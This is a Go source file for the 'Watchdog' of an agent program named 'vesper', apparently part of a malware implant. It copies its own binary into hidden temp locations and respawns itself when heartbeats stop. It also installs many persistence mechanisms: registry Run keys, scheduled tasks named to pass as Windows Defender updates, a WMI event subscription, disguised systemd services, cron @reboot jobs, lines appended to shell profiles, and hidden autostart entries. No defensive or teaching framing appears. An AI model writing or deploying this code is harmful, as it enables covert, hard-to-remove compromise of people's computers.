package agent

import (
	"context"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

type Watchdog struct {
	agent       *Agent
	heartbeatCh chan struct{}
	stopCh      chan struct{}
	mu          sync.RWMutex
	lastBeat    time.Time
	persistIdx  int
	backupPaths []string
}

func NewWatchdog(a *Agent) *Watchdog {
	return &Watchdog{
		agent:       a,
		heartbeatCh: make(chan struct{}, 10),
		stopCh:      make(chan struct{}),
		lastBeat:    time.Now(),
		persistIdx:  0,
		backupPaths: []string{},
	}
}

func (w *Watchdog) Heartbeat() {
	select {
	case w.heartbeatCh <- struct{}{}:
	default:
	}
}

func (w *Watchdog) Start(ctx context.Context) error {
	w.mu.Lock()
	w.lastBeat = time.Now()

	// Clone agent binary to backup locations
	exePath, _ := os.Executable()
	backupDirs := []string{os.TempDir(), "/var/tmp", "/dev/shm"}
	if runtime.GOOS == "windows" {
		backupDirs = []string{os.TempDir(), os.Getenv("APPDATA"), os.Getenv("LOCALAPPDATA")}
	}

	for i, dir := range backupDirs {
		backupName := fmt.Sprintf("vesper_wd_%d", time.Now().UnixNano()+int64(i))
		if runtime.GOOS == "windows" {
			backupName += ".exe"
		}
		backupPath := filepath.Join(dir, backupName)
		data, err := os.ReadFile(exePath)
		if err != nil {
			continue
		}
		os.WriteFile(backupPath, data, 0755)
		w.backupPaths = append(w.backupPaths, backupPath)
	}
	w.mu.Unlock()

	go w.monitor(ctx)
	go w.installAllPersistence()

	return nil
}

func (w *Watchdog) Stop() {
	close(w.stopCh)
}

func (w *Watchdog) monitor(ctx context.Context) {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	missedBeats := 0

	for {
		select {
		case <-ctx.Done():
			return
		case <-w.stopCh:
			return
		case <-w.heartbeatCh:
			w.mu.Lock()
			w.lastBeat = time.Now()
			missedBeats = 0
			w.mu.Unlock()
		case <-ticker.C:
			w.mu.RLock()
			since := time.Since(w.lastBeat)
			w.mu.RUnlock()

			if since > 30*time.Second {
				missedBeats++
				if missedBeats >= 3 {
					fmt.Fprintf(os.Stderr, "[WATCHDOG] Agent dead for %v, resurrecting...\n", since)
					_ = w.resurrect()
					missedBeats = 0
				}
			}
		}
	}
}

func (w *Watchdog) resurrect() error {
	w.mu.Lock()
	defer w.mu.Unlock()

	if w.persistIdx >= len(w.backupPaths) {
		w.persistIdx = 0
	}

	if len(w.backupPaths) == 0 {
		return fmt.Errorf("no backup paths available")
	}

	backupPath := w.backupPaths[w.persistIdx]
	w.persistIdx = (w.persistIdx + 1) % len(w.backupPaths)

	if _, err := os.Stat(backupPath); os.IsNotExist(err) {
		exePath, _ := os.Executable()
		data, err := os.ReadFile(exePath)
		if err != nil {
			return fmt.Errorf("cannot read self: %w", err)
		}
		os.WriteFile(backupPath, data, 0755)
	}

	// Spawn new agent from backup
	cmd := exec.Command(backupPath)
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil
	cmd.Env = os.Environ()

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("resurrection failed: %w", err)
	}

	fmt.Fprintf(os.Stderr, "[WATCHDOG] Agent resurrected from %s (PID=%d)\n", backupPath, cmd.Process.Pid)
	return nil
}

func (w *Watchdog) installAllPersistence() {
	var errs []error

	persMethods := []func() error{
		w.installRegistryRun,
		w.installScheduledTask,
		w.installWMIEventSubscription,
		w.installSystemdService,
		w.installCronReboot,
		w.installShellProfile,
		w.installXDGAutostart,
	}

	for _, method := range persMethods {
		if err := method(); err != nil {
			errs = append(errs, err)
		}
	}

	if len(errs) > 0 {
		fmt.Fprintf(os.Stderr, "[WATCHDOG] persistence install errors: %v\n", len(errs))
	}
}

func (w *Watchdog) installRegistryRun() error {
	if runtime.GOOS != "windows" {
		return nil
	}
	exePath, _ := os.Executable()
	backupPath := w.getBackupPath(0)

	cmds := [][]string{
		{"reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "vesper_wd", "/t", "REG_SZ", "/d", backupPath, "/f"},
		{"reg", "add", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "vesper_sys", "/t", "REG_SZ", "/d", exePath, "/f"},
		{"reg", "add", "HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "vesper_sys32", "/t", "REG_SZ", "/d", exePath, "/f"},
	}

	for _, cmd := range cmds {
		_ = exec.Command(cmd[0], cmd[1:]...).Run()
	}
	return nil
}

func (w *Watchdog) installScheduledTask() error {
	if runtime.GOOS != "windows" {
		return nil
	}
	exePath, _ := os.Executable()

	cmds := [][]string{
		{"schtasks", "/create", "/tn", "vesper_SecurityUpdate", "/tr", exePath, "/sc", "daily", "/st", fmt.Sprintf("%02d:%02d", rand.Intn(24), rand.Intn(60)), "/f"},
		{"schtasks", "/create", "/tn", "vesper_SystemCheck", "/tr", exePath, "/sc", "onlogon", "/f"},
		{"schtasks", "/create", "/tn", "vesper_WinDefUpd", "/tr", exePath, "/sc", "weekly", "/d", "MON", "/f"},
	}

	for _, cmd := range cmds {
		_ = exec.Command(cmd[0], cmd[1:]...).Run()
	}
	return nil
}

func (w *Watchdog) installWMIEventSubscription() error {
	if runtime.GOOS != "windows" {
		return nil
	}
	exePath, _ := os.Executable()

	psScript := fmt.Sprintf(`
$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
$filter.Name = "vesper_WMI_Filter"
$filter.Put()

$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = "vesper_WMI_Consumer"
$consumer.CommandLineTemplate = "%s"
$consumer.Put()

$binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = $filter
$binding.Consumer = $consumer
$binding.Put()
`, strings.ReplaceAll(exePath, "\\", "\\\\"))

	return exec.Command("powershell", "-Command", psScript).Run()
}

func (w *Watchdog) installSystemdService() error {
	if runtime.GOOS == "windows" {
		return nil
	}
	exePath, _ := os.Executable()

	serviceNames := []string{"vesper-cored", "system-update-check", "dbus-monitor-d"}
	for _, svcName := range serviceNames {
		serviceContent := fmt.Sprintf(`[Unit]
Description=Core System Service
After=network.target network-online.target
Wants=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=5
RuntimeMaxSec=0
PrivateTmp=yes
NoNewPrivileges=no

[Install]
WantedBy=multi-user.target
`, exePath)

		serviceDir := "/etc/systemd/system"
		if os.Geteuid() != 0 {
			serviceDir = filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user")
			os.MkdirAll(serviceDir, 0755)
		}

		os.WriteFile(filepath.Join(serviceDir, svcName+".service"), []byte(serviceContent), 0644)
		_ = exec.Command("systemctl", "daemon-reload").Run()
		if os.Geteuid() == 0 {
			_ = exec.Command("systemctl", "enable", svcName+".service").Run()
		} else {
			_ = exec.Command("systemctl", "--user", "enable", svcName+".service").Run()
		}
	}
	return nil
}

func (w *Watchdog) installCronReboot() error {
	if runtime.GOOS == "windows" {
		return nil
	}
	exePath, _ := os.Executable()

	cronEntries := []string{
		fmt.Sprintf("@reboot %s > /dev/null 2>&1", exePath),
		fmt.Sprintf("*/30 * * * * %s --check > /dev/null 2>&1", exePath),
		fmt.Sprintf("0 */2 * * * %s --heartbeat > /dev/null 2>&1", exePath),
	}

	for _, entry := range cronEntries {
		_ = exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", entry)).Run()
	}
	return nil
}

func (w *Watchdog) installShellProfile() error {
	if runtime.GOOS == "windows" {
		return nil
	}
	exePath, _ := os.Executable()

	profileFiles := []string{
		filepath.Join(os.Getenv("HOME"), ".bashrc"),
		filepath.Join(os.Getenv("HOME"), ".zshrc"),
		filepath.Join(os.Getenv("HOME"), ".profile"),
		filepath.Join(os.Getenv("HOME"), ".bash_profile"),
	}

	line := fmt.Sprintf("\n(%s --daemon &) >/dev/null 2>&1 # system update check\n", exePath)
	for _, pf := range profileFiles {
		f, err := os.OpenFile(pf, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			continue
		}
		_, _ = f.WriteString(line)
		f.Close()
	}
	return nil
}

func (w *Watchdog) installXDGAutostart() error {
	if runtime.GOOS == "windows" {
		return nil
	}
	exePath, _ := os.Executable()

	autostartDir := filepath.Join(os.Getenv("HOME"), ".config", "autostart")
	os.MkdirAll(autostartDir, 0755)

	desktopEntries := []string{
		"vesper-system-check.desktop",
		"gnome-update-service.desktop",
		"user-session-init.desktop",
	}

	for _, entryName := range desktopEntries {
		content := fmt.Sprintf(`[Desktop Entry]
Type=Application
Name=System Check
Exec=%s --daemon
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
Terminal=false
`, exePath)

		os.WriteFile(filepath.Join(autostartDir, entryName), []byte(content), 0644)
	}
	return nil
}

func (w *Watchdog) getBackupPath(idx int) string {
	w.mu.RLock()
	defer w.mu.RUnlock()
	if idx >= 0 && idx < len(w.backupPaths) {
		return w.backupPaths[idx]
	}
	exePath, _ := os.Executable()
	return exePath
}
